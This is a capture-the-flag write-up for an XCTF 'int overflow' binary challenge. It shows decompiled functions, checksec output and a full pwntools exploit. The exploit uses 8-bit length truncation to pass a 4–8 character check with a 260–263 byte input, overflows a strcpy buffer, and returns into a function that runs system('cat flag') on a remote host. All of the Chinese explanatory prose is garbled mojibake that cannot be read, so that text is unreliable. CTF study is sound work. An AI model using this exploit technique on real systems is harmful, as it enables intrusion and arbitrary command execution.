# int overflow writeup
����Ŀ�����������
�������£���ž���һ����½�ĳ�����login���ڶ����볤�Ƚ������ƣ�ͨ���˾�"Success"����"Invalid Password"��

## file ./elf

> elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped

## checksec ./elf

> [*] '/root/pwn_test/xctf_prac/int overflow/elf'
>     Arch:     i386-32-little
>     RELRO:    Partial RELRO
>     Stack:    No canary found
>     NX:       NX enabled
>     PIE:      No PIE (0x8048000)

û�ж�canary���ƣ�������NX��

## IDA�ҵ�©������

### check_passwd()

> char *__cdecl check_passwd(char *s)
> {
>   char *result; // eax
>   char dest; // [esp+4h] [ebp-14h]
>   unsigned __int8 v3; // [esp+Fh] [ebp-9h]
>
>   v3 = strlen(s);
>   if ( v3 <= 3u || v3 > 8u )
>   {
>     puts("Invalid Password");
>     result = (char *)fflush(stdout);
>   }
>   else
>   {
>     puts("Success");
>     fflush(stdout);
>     result = strcpy(&dest, s);
>   }
>   return result;
> }

�ú����д���strcpy�������ú���ʹ��ʱδ��s���Ƚ������ƣ��������Ե�ջ������������Կ��ƺ����÷��ص�ַΪelf�ṩ�ĺ���what_is_this()��

### what_is_this()

> int what_is_this()
> {
>   return system("cat flag");
> }

����������s�ĳ���:4<=v3<8ʱ����success��ʹ���������©���ƹ���

v3��8λ�޷�������:  unsigned __int8 v3; 

�������λ2^8-1=255�����ǿ��Կ���s�ĳ�����һ����Χ�ڣ�ʹ���ڳ����������������и�λ�ضϵĻ����£���������s�ĳ������ƣ���ʹ��s�ĳ����㹻���ŵ������ǵ�payload��

## s���ȼ���

1	00000000=256

1	00000000+4=260

1	00000000+7=263

���Կ���s�ĳ�����[260,263]ʱ�Ϳ��Լ����ƹ����ȼ����ƣ�s�ĳ������㹻���ŵ������ǵ�payload��

## exp

from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",33186)

payload='a'*24+p32(0x0804868B)
io.recvuntil("choice:")
io.sendline('1')
io.recvuntil('username:')
io.sendline('a')
io.recvuntil('passwd:')
io.sendline(payload.ljust(263,'a'))

io.interactive()